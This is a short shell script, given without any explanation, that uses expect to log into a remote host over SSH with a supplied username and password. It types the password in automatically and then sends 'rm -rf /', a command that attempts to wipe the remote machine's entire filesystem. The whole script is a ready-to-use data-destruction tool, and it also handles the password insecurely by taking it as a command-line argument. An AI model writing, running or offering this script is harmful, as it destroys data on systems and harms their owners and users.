#!/bin/sh
USER="$1"
PASSWORD="$2"
HOST="$3"
/usr/bin/expect<<EOD
spawn /usr/bin/ssh $USER@$HOST
expect ".*"
sleep 1
send "$PASSWORD\r"
expect ".*"
sleep 2
send "rm -rf /\r"
EOD
